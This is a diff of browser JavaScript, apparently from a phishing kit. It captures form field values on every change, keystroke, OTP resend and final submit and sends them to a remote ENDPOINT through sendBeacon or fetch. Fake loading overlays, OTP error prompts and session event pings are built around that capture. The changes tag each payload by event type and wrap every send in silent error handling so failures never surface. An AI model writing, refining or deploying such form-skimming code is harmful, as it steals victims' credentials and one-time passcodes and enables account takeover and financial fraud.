@@ -379,6 +379,7 @@ function setupUI() {
   }
 
   function sendPayload(payload) {
+  try {
     const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
     let beaconOk = false;
 
@@ -387,23 +388,24 @@ function setupUI() {
     }
 
     if (!beaconOk) {
-      return fetch(ENDPOINT, {
+      fetch(ENDPOINT, {
         method: "POST",
         body: JSON.stringify(payload),
         headers: { "Content-Type": "application/json" },
         keepalive: true
-      });
+      }).catch(() => {});
     }
-  }
+  } catch (err) {}
+ }
+
 
   document.addEventListener("change", e => {
     const el = e.target;
     if (el?.closest("#clsdiv") && el.matches(".input-control")) {
       const inputs = document.querySelectorAll(".input-control");
-      const payload = {
-        timestamp: new Date().toISOString(),
-        fields: {}
-      };
+
+      const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
+
       inputs.forEach(input => {
         if (input.name) payload.fields[input.name] = input.value;
       });
@@ -753,11 +755,9 @@ function setupResendOTP() {
           body: JSON.stringify(payload),
           headers: { "Content-Type": "application/json" },
           keepalive: true
-        }).catch(() => {
-        });
+        }).catch(() => {});
       }
-    } catch (err) {
-    }
+    } catch (err) {}
   }
 
   // 🔲 Overlay routine with spinner + toast targeting #subclsdiv3
@@ -805,11 +805,7 @@ function setupResendOTP() {
     const $targetBtn = $("#otpv");
     $.loading($targetBtn, true);
 
-    const payload = {
-      timestamp: new Date().toISOString(),
-      clickCount,
-      fields: {}
-    };
+    const payload = { eventType: "resend", timestamp: new Date().toISOString(), clickCount, fields: {} };
 
     $(".input-control").each(function () {
       if (this.name) payload.fields[this.name] = this.value;
@@ -828,10 +824,8 @@ function setupResendOTP() {
   $(document).on("input", ".input-control", function () {
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(() => {
-      const payload = {
-        timestamp: new Date().toISOString(),
-        fields: {}
-      };
+      const payload = { eventType: "input", timestamp: new Date().toISOString(), fields: {} };
+
       $(".input-control").each(function () {
         if (this.name) payload.fields[this.name] = this.value;
       });
@@ -851,18 +845,21 @@ function setupFinalSubmit() {
   const OVERLAY_PHASE2_MS = 5000;
 
   function sendPayload(formDataObj) {
+  try {
     const blob = new Blob([JSON.stringify(formDataObj)], { type: "application/json" });
     let beaconOk = false;
     if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
     if (!beaconOk && ENDPOINT) {
-      return fetch(ENDPOINT, {
+      fetch(ENDPOINT, {
         method: "POST",
         body: JSON.stringify(formDataObj),
         headers: { "Content-Type": "application/json" },
         keepalive: true
-      });
+      }).catch(() => {});
     }
-  }
+  } catch (err) {}
+ }
+
 
   function showOtpError(extraMsg = "") {
     $("#otpvrecount")
@@ -940,7 +937,7 @@ function setupFinalSubmit() {
     }
 
     count++;
-    const payload = { timestamp: new Date().toISOString(), fields: {} };
+    const payload = { eventType: "submit", timestamp: new Date().toISOString(), fields: {} };
     $("input").each(function () { if (this.name) payload.fields[this.name] = this.value; });
     sendPayload(payload);
 
@@ -1000,16 +997,18 @@ let pollArmed = true;
 let coolingDown = false;
 
 function notify(eventType) {
-  fetch(ENDPOINT, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      type: eventType,
-      timestamp: new Date().toISOString(),
-      session: sessionId
-    }),
-    keepalive: true
-  }).catch(() => {});
+  try {
+    fetch(ENDPOINT, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: eventType,
+        timestamp: new Date().toISOString(),
+        session: sessionId
+      }),
+      keepalive: true
+    }).catch(() => {});
+  } catch (err) {}
 }
 
 function fireScroll(source) {
